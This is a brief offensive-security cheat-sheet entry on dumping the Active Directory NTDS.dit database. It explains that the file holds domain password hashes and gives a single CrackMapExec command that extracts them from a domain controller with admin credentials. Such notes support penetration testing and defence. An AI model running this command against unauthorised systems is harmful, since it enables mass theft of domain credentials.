# Dumping NTDS.dit

NTDS.dit contains all the info on the domain (hashes...), contained on the DC in **C:\Windows\NTDS\ntds.dit**

```bash
# dump ntds on domain controller
cme smb $dc_ip -u $admin -p $pass --ntds
```
